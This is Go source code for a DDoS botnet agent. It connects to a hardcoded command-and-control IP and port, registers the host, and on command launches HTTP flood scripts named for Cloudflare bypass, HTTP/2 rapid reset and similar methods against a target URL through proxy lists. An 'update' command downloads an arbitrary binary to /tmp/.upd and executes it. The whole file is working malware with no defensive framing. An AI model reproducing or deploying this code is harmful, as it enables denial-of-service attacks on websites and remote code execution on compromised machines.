package main

import (
	"bufio"
	"context"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	ServerIP   = "77.239.124.255"
	ServerPort = "9111"
)

type floodEntry struct {
	cancel context.CancelFunc
	id     int64
}

var (
	activeFloods   = make(map[string]floodEntry)
	activeFloodsMu sync.Mutex
	floodIDCounter int64
	botBusy        atomic.Int32
)

func getBinName() string {
	return "l7d"
}

var jsScripts = map[string]string{
	"browser":    "scripts/browser.js",
	"cache-bp":   "scripts/cache1.js",
	"cf-bypass":  "scripts/cfvBypass.js",
	"cfpro":      "scripts/cfpro.js",
	"cloudstorm": "scripts/cloudstorm.js",
	"erebus":     "scripts/erebus.js",
	"fatzx":      "scripts/fatzx.js",
	"h2reset":    "scripts/h2rapidreset.js",
	"http-huricane": "scripts/flood.js",
	"httpkill":   "scripts/httpkill.js",
	"hybrid":     "scripts/hybrid.js",
	"ngtuan":     "scripts/ngtuan.js",
	"priv-flood": "scripts/priv-flood.js",
	"tls":        "scripts/tls.js",
	"xreset":     "scripts/xreset.js",
	"zenith":     "scripts/zenith.js",
}

// scriptArgOrder maps each method to default arguments (after URL and time)
// needed to satisfy the JS script's positional argument expectations.
// The user types: method <url> <time>
// We build: node script.js [defaults...] <url> <time> [defaults...]
var scriptArgOrder = map[string]struct {
	before []string // inserted before url and time
	after  []string // appended after url and time
}{
	"browser":    {nil, nil}, // obfuscated — pass url + time only
	"cache-bp":   {[]string{"GET"}, []string{"10", "1000"}},
	"cf-bypass":  {nil, []string{"1000", "10", "proxies.txt"}},
	"cfpro":      {[]string{"GET"}, []string{"proxies.txt", "1000", "10"}},
	"cloudstorm": {nil, []string{"10"}},
	"erebus":     {nil, []string{"1000", "10", "proxies.txt"}},
	"fatzx":      {nil, []string{"1000", "10"}},
	"h2reset":    {nil, []string{"1000", "10", "proxies.txt"}},
	"http-huricane": {nil, []string{"10", "proxies.txt", "1000"}},
	"httpkill":   {nil, []string{"10", "proxies.txt", "1000"}},
	"hybrid":     {nil, []string{"10", "1000", "proxies.txt"}},
	"ngtuan":     {nil, []string{"10", "proxies.txt", "1000"}},
	"priv-flood": {[]string{"GET"}, []string{"10", "1000", "proxies.txt"}},
	"tls":        {nil, []string{"10", "10", "proxies.txt"}},
	"xreset":     {nil, []string{"10", "1000", "proxies.txt", "ipv4"}},
	"zenith":     {nil, []string{"1000", "10", "proxies.txt"}},
}

func main() {
	for {
		conn, er := net.Dial("tcp", ServerIP+":"+ServerPort)
		if er != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		if tcp, ok := conn.(*net.TCPConn); ok {
			tcp.SetKeepAlive(true)
			tcp.SetKeepAlivePeriod(10 * time.Second)
		}

		conn.Write([]byte("REGISTER " + runtime.GOOS + " " + runtime.GOARCH + " 0 0 0 l7\n"))

		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			args := strings.Fields(scanner.Text())
			if len(args) == 0 {
				continue
			}

			if !methodAllowed(args[0]) {
				continue
			}
			switch args[0] {
			case "stop":
				if len(args) < 2 {
					continue
				}
				activeFloodsMu.Lock()
				if e, ok := activeFloods[args[1]]; ok {
					e.cancel()
					delete(activeFloods, args[1])
				}
				activeFloodsMu.Unlock()

			case "update":
				updateURL := ""
				if len(args) >= 2 {
					updateURL = args[1]
				} else {
					updateURL = "http://" + ServerIP + "/" + getBinName()
				}
				go func(c net.Conn) {
					resp, err := http.Get(updateURL)
					if err != nil {
						c.Write([]byte("UPDATE_FAIL\n"))
						return
					}
					defer resp.Body.Close()
					tmp := "/tmp/.upd"
					f, err := os.OpenFile(tmp, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
					if err != nil {
						c.Write([]byte("UPDATE_FAIL\n"))
						return
					}
				if _, err := io.Copy(f, resp.Body); err != nil {
					f.Close(); os.Remove(tmp)
					c.Write([]byte("UPDATE_FAIL\n")); return
				}
				f.Close()
				if fi, _ := os.Stat(tmp); fi != nil && fi.Size() > 4096 {
						c.Write([]byte("UPDATE_OK\n"))
						syscall.Exec(tmp, []string{tmp}, os.Environ())
					}
					c.Write([]byte("UPDATE_FAIL\n"))
					os.Remove(tmp)
				}(conn)

			default:
				scriptPath, ok := jsScripts[args[0]]
				if !ok {
					continue
				}
				if len(args) < 3 {
					continue
				}
				url := args[1]
				timeStr := args[len(args)-1]
				d, _ := strconv.Atoi(timeStr)
				startAttack(args[0], d, func(cx context.Context) {
					resolved := scriptPath
					if !filepath.IsAbs(resolved) {
						exe, _ := os.Executable()
						resolved = filepath.Join(filepath.Dir(exe), resolved)
					}
					if _, err := os.Stat(resolved); os.IsNotExist(err) {
						return
					}
					order := scriptArgOrder[args[0]]
					jsArgs := []string{resolved}
					jsArgs = append(jsArgs, order.before...)
					jsArgs = append(jsArgs, url, timeStr)
					jsArgs = append(jsArgs, order.after...)
					cmd := exec.Command("node", jsArgs...)
					cmd.Stdout = nil
					cmd.Stderr = nil
					if err := cmd.Start(); err != nil {
						return
					}
					done := make(chan error, 1)
					go func() { done <- cmd.Wait() }()
					select {
					case <-cx.Done():
						if cmd.Process != nil {
							cmd.Process.Kill()
						}
					case <-done:
					}
				})
			}
		}
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func methodAllowed(name string) bool {
	if name == "stop" || name == "update" {
		return true
	}
	switch name {
	case "browser", "cache-bp", "cf-bypass", "cfpro", "cloudstorm", "erebus", "fatzx", "h2reset", "http-huricane", "httpkill", "hybrid", "ngtuan", "priv-flood", "tls", "xreset", "zenith":
		return true
	}
	return false
}

func startAttack(target string, duration int, fn func(context.Context)) {
	if !botBusy.CompareAndSwap(0, 1) {
		return
	}
	if duration < 1 || duration > 86400*7 {
		duration = 86400
	}
	id := atomic.AddInt64(&floodIDCounter, 1)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	activeFloodsMu.Lock()
	if e, ok := activeFloods[target]; ok {
		e.cancel()
	}
	activeFloods[target] = floodEntry{cancel: cancel, id: id}
	activeFloodsMu.Unlock()
	go func() {
		defer botBusy.Store(0)
		fn(ctx)
		activeFloodsMu.Lock()
		if e, ok := activeFloods[target]; ok && e.id == id {
			delete(activeFloods, target)
		}
		activeFloodsMu.Unlock()
	}()
}
